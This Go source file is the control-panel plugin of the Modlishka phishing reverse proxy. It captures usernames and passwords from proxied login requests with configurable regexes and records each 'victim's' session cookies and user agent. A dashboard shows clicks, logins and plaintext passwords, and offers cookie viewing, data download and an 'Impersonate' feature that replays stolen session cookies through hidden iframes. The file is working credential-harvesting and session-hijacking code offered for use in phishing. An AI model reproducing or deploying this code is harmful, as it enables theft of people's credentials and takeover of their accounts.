/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package plugin

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/drk1wi/Modlishka/config"
	"github.com/drk1wi/Modlishka/log"
	"github.com/drk1wi/Modlishka/runtime"
	"github.com/tidwall/buntdb"
)

type ExtendedControlConfiguration struct {
	*config.Options
	CredParams   *string `json:"credParams"`
	ControlURL   *string `json:"ControlURL"`
	ControlCreds *string `json:"ControlCreds"`
}

type ControlConfig struct {
	db             *buntdb.DB
	usernameRegexp *regexp.Regexp
	passwordRegexp *regexp.Regexp
	active         bool
	url            string
	controlUser    string
	controlPass    string
}

type RequetCredentials struct {
	usernameFieldValue string
	passwordFieldValue string
}

var htmltemplate = `<!DOCTYPE html>
<html lang="en">
<head>
  <title>Modlishka Control Panel v.0.1 (beta)</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="refresh" content="15">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script>

function clearcookies(){
    var cookies = document.cookie.split("; ");
    for (var c = 0; c < cookies.length; c++) {
        var d = window.location.hostname.split(".");
        while (d.length > 0) {
            var cookieBase = encodeURIComponent(cookies[c].split(";")[0].split("=")[0]) + '=; expires=Thu, 01-Jan-1970 00:00:01 GMT; domain=' + d.join('.') + ' ;path=';
            var p = location.pathname.split('/');
            document.cookie = cookieBase + '/';
            while (p.length > 0) {
                document.cookie = cookieBase + p.join('/');
                p.pop();
            };
            d.shift();
        }
    }
};

function deleteVictim(uuid){
	$.ajax({
		url: '/{{$.URL}}/DeleteVictim?user_id='+uuid,
		type: 'DELETE',
		success: function (result) {
			document.location.reload()
		}
	});
}

function downloadData() {
	const link = document.createElement("a");
	link.href = "/{{$.URL}}/DownloadData";
	link.download = "data.txt";
	document.body.appendChild(link);
	link.click();
	document.body.removeChild(link);
}

  </script>
</head>
<body>

<div class="container">
  <div class="row">
      <div class="col-md-4 text-center">
          <h4>Clicks</h4>
          <p style="font-weight:bold;font-size: 1em;">{{len .Victims}}</p>
      </div>
      <div class="col-md-4 text-center">
          <h4>Logins</h4>
          <p style="font-weight:bold;font-size: 1em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
      </div>
      <div class="col-md-4 text-center">
          <h4>Terminations</h4>
          <p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
      </div>
	<div class="col-md-4 text-center">
		<button onclick="downloadData()" class="btn btn-success">Download Data</button>
	  </div>
  </div>
  
  <hr>

  <div class="row">

  <table class="table table-dark">
    <thead class="thead-dark">
      <tr>
        <th class="text-center">Timestamp</th>
        <th class="text-center">UUID</th>
        <th class="text-center">Username</th>
        <th class="text-center">Password</th>
        <th class="text-center">Terminated</th>
        <th class="text-center"></th>

      </tr>
    </thead>
    <tbody>
    {{range .Victims}}
      <tr>
        {{if .Timestamp}}
        <td class="text-center">{{.Timestamp.Format "1/2/06 15:04:05"}}</td>
        {{else}}
        <td class="text-center"></td>
        {{end}}
        <td class="text-center">{{.UUID}}</td>
        <td class="text-center">{{.Username}}</td>
        <td class="text-center">{{.Password}}</td>
        <td class="text-center">
        {{if .Terminated}}
        <span style="color: green; font-weight: bold;">Y</span>
        {{else}}
        <span style="color: red; font-weight: bold;">N</span>
        {{end}}
        </td>
        {{/* This requires additional coding ... <td><a onclick="clearcookies();" href="/{{$.URL}}/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a> */}}
        <td class="text-center">
			<div class="btn-group" role="group">
				<a href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
				<button onclick="deleteVictim('{{.UUID}}')" class="btn btn-danger">Delete</button>
			</div>
        </td>

      </tr>
    {{end}}
    </tbody>
  </table>
</div>
</div>

</body>
</html>
`

var iframetemplate = `<!DOCTYPE html>
<html lang="en">
<head>
 <title>Modlishka Control Panel v.0.1.</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<style>

html,body{
       width: 100%;
       height: 100%;
}

 body {
     background: #0d161f;
}

#circle {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%,-50%);
    width: 150px;
    height: 150px;	
}

.loader {
    width: calc(100% - 0px);
    height: calc(100% - 0px);
    border: 8px solid #162534;
    border-top: 8px solid #09f;
    border-radius: 50%;
    animation: rotate 5s linear infinite;
}

@keyframes rotate {
100% {transform: rotate(360deg);}
} </style>
</head>
<body>
<script>

setTimeout(function() {document.location='/'; }, 5000); 

</script>

<div id="circle">
  <div class="loader">
    <div class="loader">
        <div class="loader">
           <div class="loader">
           </div>
        </div>
    </div>
  </div>
</div> 

 {{range .}}
 <iframe style="width:0; height:0; border:0; border:none" src="{{.}}"></iframe>
 {{ end }}

</body>
</html>
`

type TemplateOutput struct {
	Cookies   string
	UserAgent string
}

var cookietemplate = `<!DOCTYPE html>
<html lang="en">
<head>
  <title>Modlishka Control Panel v.0.1 (beta)</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>

<div class="container">
  <h2>User Agent</h2>
  <pre>{{ .UserAgent }}</pre>
  <h2>Cookies</h2>
  <pre>{{ .Cookies }}</pre>
</div>

</body>
</html>
`

type Victim struct {
	Timestamp  *time.Time
	UUID       string
	Username   string
	Password   string
	Session    string
	UserAgent  string
	Terminated bool
}

type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`

	Path       string    `json:"path"`
	Domain     string    `json:"domain"`
	Expires    time.Time `json:"expire"`
	RawExpires string

	// MaxAge=0 means no 'Max-Age' attribute specified.
	// MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
	// MaxAge>0 means Max-Age attribute present and given in seconds
	MaxAge   int
	Secure   bool `json:"secure"`
	HttpOnly bool `json:"httpOnly"`
	SameSite http.SameSite
}

type CookieJar struct {
	Cookies map[string]*Cookie `json:"cookies"`
}

var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
var controlURL = flag.String("controlURL", "SayHello2Modlishka", "URL to view captured credentials and settings.")
var controlCredentials = flag.String("controlCreds", "", "Username and password to protect the credentials page.  user:pass format")

var CConfig ControlConfig

func getEmptyJar() (*CookieJar, error) {

	jar := CookieJar{
		Cookies: make(map[string]*Cookie),
	}

	return &jar, nil
}

func sameDomainLevel(domain1 string, domain2 string) bool {
	return bool(len(strings.Split(domain1, ".")) == len(strings.Split(domain2, ".")))

}

func sameDomainUpperLevel(domain1 string, domain2 string) bool {
	d1 := strings.Split(domain1, ".")
	d1out := strings.Join(d1, "")

	d2 := strings.Split(domain2, ".")
	d2out := strings.Join(d2, "")

	return strings.Contains(d1out, d2out)

}

func (jar *CookieJar) setCookie(cookie *Cookie) {

	if jar.Cookies[cookie.Name] == nil {
		jar.Cookies[cookie.Name] = cookie
	}

	if !cookie.Expires.IsZero() && cookie.Expires.Before(time.Now()) {
		delete(jar.Cookies, cookie.Name)
		return
	}

	if jar.Cookies[cookie.Name].Domain == "" {
		jar.Cookies[cookie.Name].Domain = cookie.Domain
	}

	if sameDomainUpperLevel(jar.Cookies[cookie.Name].Domain, cookie.Domain) {
		jar.Cookies[cookie.Name].Domain = cookie.Domain
	}

	jar.Cookies[cookie.Name].Value = cookie.Value

}

func (jar *CookieJar) marshalJSON() ([]byte, error) {

	b, err := json.Marshal(jar)
	return b, err

}

func (jar *CookieJar) initJSON(val []byte) error {

	err := json.Unmarshal([]byte(val), &jar)
	if err != nil {
		return err
	}

	return nil

}

func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {

	jar, err := getEmptyJar()
	if err != nil {
		return err
	}

	if victim.Session != "" {
		err = json.Unmarshal([]byte(victim.Session), &jar)
		if err != nil {
			return err
		}
	}

	for _, v := range cookies {
		c := Cookie{
			Name:       v.Name,
			Value:      v.Value,
			Path:       v.Path,
			Domain:     v.Domain,
			Expires:    v.Expires,
			RawExpires: v.RawExpires,
			MaxAge:     v.MaxAge,
			HttpOnly:   v.HttpOnly,
			Secure:     v.Secure,
			SameSite:   v.SameSite,
		}

		jar.setCookie(&c)

	}

	b, err := jar.marshalJSON()
	if err != nil {
		log.Debugf("%s", err.Error())
	}
	victim.Session = string(b)

	return nil
}

func (config *ControlConfig) printEntries() error {

	err := config.db.View(func(tx *buntdb.Tx) error {
		err := tx.Ascend("", func(key, value string) bool {
			//log.Infof("key: %s, value: %s\n", key, value)
			return true
		})
		return err
	})

	if err != nil {
		return err
	}

	return nil
}

func (config *ControlConfig) listEntries() ([]Victim, error) {

	victims := []Victim{}
	err := config.db.View(func(tx *buntdb.Tx) error {
		err := tx.Ascend("", func(key, value string) bool {
			victim := Victim{}
			err := json.Unmarshal([]byte(value), &victim)
			if err != nil {
				return false
			}
			victims = append(victims, victim)
			return true
		})
		return err
	})

	if err != nil {
		return nil, err
	}

	return victims, nil
}

func (config *ControlConfig) getEntry(victim *Victim) (*Victim, error) {

	returnentry := Victim{}
	err := config.db.View(func(tx *buntdb.Tx) error {
		val, err := tx.Get(victim.UUID)
		if err != nil {
			return err
		}

		victim := Victim{}
		err = json.Unmarshal([]byte(val), &victim)
		if err != nil {
			return err
		}
		returnentry = victim
		return nil
	})

	if err != nil {
		return nil, err
	}

	return &returnentry, nil
}

func (config *ControlConfig) getOrCreateEntry(victim *Victim) (*Victim, error) {

	entry, err := config.getEntry(victim)
	if err == buntdb.ErrNotFound {
		err = config.addEntry(victim)
		if err != nil {
			return nil, err
		}
		entry = victim
	}

	return entry, nil
}

func (config *ControlConfig) addEntry(victim *Victim) error {

	//log.Infof("Adding entry %s %s %s",victim.UUID,victim.Username,victim.Password)

	b, err := json.Marshal(victim)
	if err != nil {
		return err
	}

	err = config.db.Update(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(victim.UUID, string(b), nil)
		return err
	})

	return nil
}

func (config *ControlConfig) updateEntry(victim *Victim) error {

	entry, err := CConfig.getOrCreateEntry(victim)
	if err != nil {
		return err
	}

	if victim.Timestamp != nil {
		entry.Timestamp = victim.Timestamp
	}

	if victim.Password != "" {
		entry.Password = victim.Password
	}
	if victim.Username != "" {
		entry.Username = victim.Username
	}

	if victim.Session != "" {
		entry.Session = victim.Session
	}

	if victim.Terminated {
		entry.Terminated = true
	}

	if victim.UserAgent != "" {
		entry.UserAgent = victim.UserAgent
	}

	err = config.addEntry(entry)
	if err != nil {
		return err
	}

	return nil
}

func (config *ControlConfig) deleteEntry(victim *Victim) error {
	entry, err := config.getEntry(victim)
	if err == buntdb.ErrNotFound {
		return nil
	}

	err = config.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(entry.UUID)
		return err
	})

	return err
}

func notifyCollection(victim *Victim) {

	if victim.Username != "" && victim.Password != "" {
		log.Infof("Credentials collected ID:[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
	}

	if victim.Username == "" && victim.Password != "" {
		log.Infof("Password collected ID:[%s] password: %s", victim.UUID, victim.Password)
	}

	if victim.Username != "" && victim.Password == "" {
		log.Infof("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
	}
}

func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*RequetCredentials, bool) {

	creds := &RequetCredentials{}

	if req.Method == "GET" {
		queryString := req.URL.Query()
		if len(queryString) > 0 {
			for key := range req.URL.Query() {

				usernames := config.usernameRegexp.FindStringSubmatch(queryString.Get(key))
				if len(usernames) > 0 {
					creds.usernameFieldValue = usernames[1]
				}

				passwords := config.passwordRegexp.FindStringSubmatch(queryString.Get(key))
				if len(passwords) > 0 {
					creds.passwordFieldValue = passwords[1]
				}

			}
		}

	} else if req.Method == "POST" {

		if req.Body == nil {
			return nil, false
		}

		body, err := io.ReadAll(req.Body)
		if err != nil {
			log.Debugf("Error reading body: %v", err)
		}

		rawBody := string(body)
		decodedbody, err := url.QueryUnescape(rawBody)
		if err != nil {
			log.Debugf("Error decoding body: %v", err)
		}

		//log.Infof("%s",decodedbody)

		usernames := config.usernameRegexp.FindStringSubmatch(decodedbody)
		if len(usernames) > 0 {
			creds.usernameFieldValue = usernames[1]
		}

		passwords := config.passwordRegexp.FindStringSubmatch(decodedbody)
		if len(passwords) > 0 {
			//decodedPasswd, err := url.QueryUnescape(passwords[1])
			//if err != nil {
			//	log.Debugf("Error decoding passwd: %v", err)
			//}
			creds.passwordFieldValue = passwords[1]
		}

		//for parameterName := range req.Form {
		//	log.Infof("param value %s",req.Form.Get(parameterName))
		//
		//}

		// reset body state.
		req.Body = io.NopCloser(bytes.NewBuffer(body))

	}

	if creds.passwordFieldValue != "" || creds.usernameFieldValue != "" {
		return creds, true

	}

	return nil, false
}

func HelloHandler(w http.ResponseWriter, r *http.Request) {

	w.WriteHeader(http.StatusOK)
	w.Header().Set("Content-Type", "application/json")

	victims, _ := CConfig.listEntries()
	sort.SliceStable(victims, func(i, j int) bool {
		ti := victims[i].Timestamp
		tj := victims[j].Timestamp

		if ti == nil && tj == nil {
			return true
		}

		if tj == nil {
			return true
		}

		if ti == nil {
			return false
		}

		if ti.Equal(*tj) {
			return true
		}

		return ti.Before(*tj)
	})

	credsCount := 0
	for _, v := range victims {
		if v.Password != "" {
			credsCount += 1
		}
	}
	termCount := 0
	for _, v := range victims {
		if v.Terminated {
			termCount += 1
		}
	}
	data := struct {
		Victims      []Victim
		CredsCount   int
		TermCount    int
		CredsPercent float64
		TermPercent  float64
		URL          string
	}{
		victims,
		credsCount,
		termCount,
		float64(credsCount) / float64(len(victims)) * 100,
		float64(termCount) / float64(len(victims)) * 100,
		CConfig.url,
	}
	t := template.New("modlishka")
	t, _ = t.Parse(htmltemplate)
	err := t.Execute(w, data)
	if err != nil {
		log.Errorf("Error %s", err)
	}

	//v,_ :=json.Marshal(&victims)
	//io.WriteString(w,string(v))
}

func HelloHandlerDeleteVictim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	users, ok := r.URL.Query()["user_id"]

	if !ok {
		log.Infof("Url Param 'users_id' is missing")
		return
	}

	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
	err := CConfig.deleteEntry(&victim)
	if err != nil {
		log.Infof("Error %s", err.Error())
	}
}

func HelloHandlerDownloadData(w http.ResponseWriter, r *http.Request) {

	//Grabbing Entries
	victims, _ := CConfig.listEntries()

	var recordString strings.Builder
	var terminateString string

	for _, victim := range victims {

		if victim.Username != "" || victim.Password != "" {

			if victim.Terminated == true {
				terminateString = "Y"
			} else {
				terminateString = "N"
			}

			recordString.WriteString(fmt.Sprintf("UUID: %s\nUsername: %s\nTerminated: %s\n\n",
				victim.UUID, victim.Username, terminateString))
		}
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", "attachment; filename=\"data.txt\"")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(recordString.String()))
}

func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {

	users, ok := r.URL.Query()["user_id"]

	if !ok || len(users[0]) < 1 {
		log.Infof("Url Param 'users_id' is missing")
		return
	}

	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
	entry, err := CConfig.getEntry(&victim)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}
	var jar = CookieJar{}
	err = json.Unmarshal([]byte(entry.Session), &jar)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}

	for _, v := range jar.Cookies {

		if r.Host == v.Domain || r.Host == v.Domain[1:] {
			cookie := fmt.Sprintf("%s=%s;Domain=%s; Path=/; Expires=%s;Priority=HIGH",
				v.Name,
				v.Value,
				v.Domain,
				time.Now().Add(365*24*time.Hour).UTC().String())

			if v.Secure {
				cookie = cookie + ";Secure"
			}

			if v.HttpOnly {
				cookie = cookie + ";HttpOnly"
			}

			w.Header().Add("Set-Cookie", cookie)
		}

	}

	w.Header().Get("Set-Cookie")

	w.WriteHeader(http.StatusOK)

	w.Header().Set("Content-Type", "application/html")

	_, _ = io.WriteString(w, "")

}

func HelloHandlerImpersonateFrames(w http.ResponseWriter, r *http.Request) {

	users, ok := r.URL.Query()["user_id"]

	if !ok || len(users[0]) < 1 {
		log.Infof("Url Param 'users_id' is missing")
		return
	}

	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
	entry, err := CConfig.getEntry(&victim)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}
	var jar = CookieJar{}
	err = json.Unmarshal([]byte(entry.Session), &jar)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}

	domains := make(map[string]string)

	for _, v := range jar.Cookies {

		if string(v.Domain[0]) == "." {
			domains[v.Domain[1:]] = ""
		} else {
			domains[v.Domain] = ""
		}
	}

	var iframes []string
	for k, _ := range domains {
		iframes = append(iframes, "https://"+k+"/"+CConfig.url+"/Impersonate?user_id="+users[0])
	}

	w.WriteHeader(http.StatusOK)

	w.Header().Set("Content-Type", "application/html")

	t := template.New("modlishkaiframe")
	t, _ = t.Parse(iframetemplate)
	_ = t.Execute(w, iframes)

}

func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {

	users, ok := r.URL.Query()["user_id"]

	if !ok || len(users[0]) < 1 {
		log.Infof("Url Param 'users_id' is missing")
		return
	}

	victim := Victim{UUID: users[0], Username: "", Password: "", Session: "", UserAgent: ""}
	entry, err := CConfig.getEntry(&victim)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}
	var jar = CookieJar{}
	err = json.Unmarshal([]byte(entry.Session), &jar)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}

	var cookies []Cookie
	for _, v := range jar.Cookies {
		newCookie := v
		newCookie.Domain = runtime.PhishURLToRealURL(v.Domain)
		cookies = append(cookies, *v)
	}

	cookiesByte, _ := json.MarshalIndent(cookies, "", "  ")
	cookiesOut := string(cookiesByte)

	userAgentOut := entry.UserAgent

	templateData := TemplateOutput{Cookies: cookiesOut, UserAgent: userAgentOut}

	w.WriteHeader(http.StatusOK)

	w.Header().Set("Content-Type", "application/html")

	t := template.New("modlishkacookiejson")
	t, _ = t.Parse(cookietemplate)
	_ = t.Execute(w, templateData)

}

// Copied from https://gist.github.com/elithrar/9146306
func use(h http.HandlerFunc, middleware ...func(http.HandlerFunc) http.HandlerFunc) http.HandlerFunc {
	for _, m := range middleware {
		h = m(h)
	}

	return h
}

// Based on https://gist.github.com/elithrar/9146306
func basicAuth(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {

		if CConfig.controlUser == "" {
			h.ServeHTTP(w, r)
			return
		}

		w.Header().Set("WWW-Authenticate", `Basic realm="Restricted"`)

		s := strings.SplitN(r.Header.Get("Authorization"), " ", 2)
		if len(s) != 2 {
			http.Error(w, "Not authorized", 401)
			return
		}

		b, err := base64.StdEncoding.DecodeString(s[1])
		if err != nil {
			http.Error(w, err.Error(), 401)
			return
		}

		pair := strings.SplitN(string(b), ":", 2)
		if len(pair) != 2 {
			http.Error(w, "Not authorized", 401)
			return
		}

		if pair[0] != CConfig.controlUser || pair[1] != CConfig.controlPass {
			http.Error(w, "Not authorized", 401)
			return
		}

		h.ServeHTTP(w, r)
	}
}

func init() {

	s := Property{}
	s.Name = "control_panel"
	s.Description = "This is a web control panel for your phishing engagements. Beta version."
	s.Version = "0.1"

	//init all of the vars, print a welcome message, init your command line flags here
	s.Init = func() {

		//init database
		db, err := buntdb.Open("control_plugin_data.db")
		if err != nil {
			log.Fatal(err)
		}

		err = db.SetConfig(buntdb.Config{
			SyncPolicy: buntdb.EverySecond,
		})

		if err != nil {
			log.Fatal(err)
		}

		CConfig.db = db

	}

	// process all of the cmd line flags and config file (if supplied)
	s.Flags = func() {

		CConfig.active = false

		// Regexes to grab username and passwords sent in POST
		var creds []string
		// Credentials to log into the control page
		var controlCreds []string

		var jsonConfig ExtendedControlConfiguration

		if len(*config.JSONConfig) > 0 {

			ct, err := os.Open(*config.JSONConfig)
			if err != nil {
				log.Errorf("Error opening JSON configuration (%s): %s", *config.JSONConfig, err)
				return
			}

			ctb, _ := io.ReadAll(ct)
			if err = json.Unmarshal(ctb, &jsonConfig); err != nil {
				log.Errorf("Error unmarshalling JSON configuration (%s): %s", *config.JSONConfig, err)
				return
			}

			if err := ct.Close(); err != nil {
				log.Errorf("Error closing JSON configuration (%s): %s", *config.JSONConfig, err)
				return
			}

		}

		if jsonConfig.ControlURL != nil {
			CConfig.url = *jsonConfig.ControlURL
		} else if *controlURL != "" {
			CConfig.url = *controlURL
		}

		if jsonConfig.ControlCreds != nil {
			controlCreds = strings.Split(*jsonConfig.ControlCreds, ":")
		} else if *controlCredentials != "" {
			controlCreds = strings.Split(*controlCredentials, ":")
		}

		if len(controlCreds) == 2 {
			CConfig.controlUser = controlCreds[0]
			CConfig.controlPass = controlCreds[1]
		} else if len(controlCreds) == 1 || len(controlCreds) > 2 {
			log.Fatalf("Control credentials must be provided in user:pass format")
		}

		if jsonConfig.CredParams != nil {
			creds = strings.Split(*jsonConfig.CredParams, ",")
		} else if *credentialParameters != "" {
			creds = strings.Split(*credentialParameters, ",")
		}

		if len(creds) > 1 {

			decodedusername, err := base64.StdEncoding.DecodeString(creds[0])
			if err != nil {
				log.Fatalf("decode error: %s\n", err)
				return
			}
			decodedpaswrd, err := base64.StdEncoding.DecodeString(creds[1])
			if err != nil {
				log.Fatalf("decode error: %s\n", err)
				return
			}

			CConfig.usernameRegexp = regexp.MustCompile(string(decodedusername))
			CConfig.passwordRegexp = regexp.MustCompile(string(decodedpaswrd))

			CConfig.active = true
			log.Infof("Control Panel: Collecting usernames with [%s] regex and passwords with [%s] regex", string(decodedusername), string(decodedpaswrd))

		}

	}

	// Register your http handlers
	s.RegisterHandler = func(handler *http.ServeMux) {

		handler.HandleFunc("/"+CConfig.url+"/", use(HelloHandler, basicAuth))
		handler.HandleFunc("/"+CConfig.url+"/ImpersonateFrames", use(HelloHandlerImpersonateFrames, basicAuth))
		handler.HandleFunc("/"+CConfig.url+"/Impersonate", use(HelloHandlerImpersonate, basicAuth))
		handler.HandleFunc("/"+CConfig.url+"/Cookies", use(HelloHandlerCookieDisplay, basicAuth))
		handler.HandleFunc("/"+CConfig.url+"/DeleteVictim", use(HelloHandlerDeleteVictim, basicAuth))
		handler.HandleFunc("/"+CConfig.url+"/DownloadData", use(HelloHandlerDownloadData, basicAuth))

		log.Infof("Control Panel: " + CConfig.url + " handler registered	")
		log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)

	}

	//process HTTP request
	s.HTTPRequest = func(req *http.Request, context *HTTPContext) {

		if CConfig.active {
			now := time.Now()

			if context.UserID != "" {
				// Save every new ID that comes to the site
				victim := Victim{UUID: context.UserID, Timestamp: &now}
				_, err := CConfig.getEntry(&victim)
				// Entry doesn't exist yet
				if err != nil {
					if err := CConfig.updateEntry(&victim); err != nil {
						log.Infof("Error %s", err.Error())
						return
					}
				}
			}

			if creds, found := CConfig.checkRequestCredentials(req); found {

				victim := Victim{
					UUID:      context.UserID,
					Username:  creds.usernameFieldValue,
					Password:  creds.passwordFieldValue,
					Timestamp: &now,
				}

				if err := CConfig.updateEntry(&victim); err != nil {
					log.Infof("Error %s", err.Error())
					return
				}
				notifyCollection(&victim)
				//_=CConfig.printEntries()

			}

			// update user agent string
			victim := Victim{UUID: context.UserID}
			entry, err := CConfig.getEntry(&victim)
			if err == nil {
				entry.UserAgent = req.Header.Get("User-Agent")
				_ = CConfig.updateEntry(entry)
			}

			cookies := req.Cookies()
			// there are new set-cookies
			if len(cookies) > 0 {
				victim := Victim{UUID: context.UserID}
				entry, err := CConfig.getEntry(&victim)
				if err != nil {
					return
				}

				for i := range cookies {
					cookies[i].Domain = context.OriginalTarget
				}

				err = entry.setCookies(cookies, context.Target)
				if err != nil {
					return
				}

				err = CConfig.updateEntry(entry)
				if err != nil {
					return
				}

			}

		}

	}

	//process HTTP response (responses can arrive in random order)
	s.HTTPResponse = func(resp *http.Response, context *HTTPContext, buffer *[]byte) {

		cookies := resp.Cookies()
		// there are new set-cookies
		if len(cookies) > 0 {

			victim := Victim{UUID: context.UserID}
			entry, err := CConfig.getEntry(&victim)
			if err != nil {
				return
			}

			for i, _ := range cookies {
				if cookies[i].Domain == "" {
					td := strings.Replace(*config.C.Target, "http://", "", -1)
					td = strings.Replace(td, "https://", "", -1)
					t := strings.Replace(context.Target.Host, td, *config.C.ProxyDomain, -1)
					cookies[i].Domain = t
				}

				//log.Infof("%s",cookies[i].Domain)

			}

			err = entry.setCookies(cookies, context.Target)
			if err != nil {
				return
			}

			err = CConfig.updateEntry(entry)
			if err != nil {
				return
			}

		}

	}

	s.TerminateUser = func(userID string) {
		log.Infof("Invoking control terminate")
		// time.Now().Format("1/2/06 15:04:05")

		now := time.Now()
		victim := Victim{
			UUID:       userID,
			Terminated: true,
			Timestamp:  &now,
		}
		err := CConfig.updateEntry(&victim)
		if err != nil {
			log.Errorf("Error %s", err)
			return
		}

	}

	// Register all the function hooks
	s.Register()

}
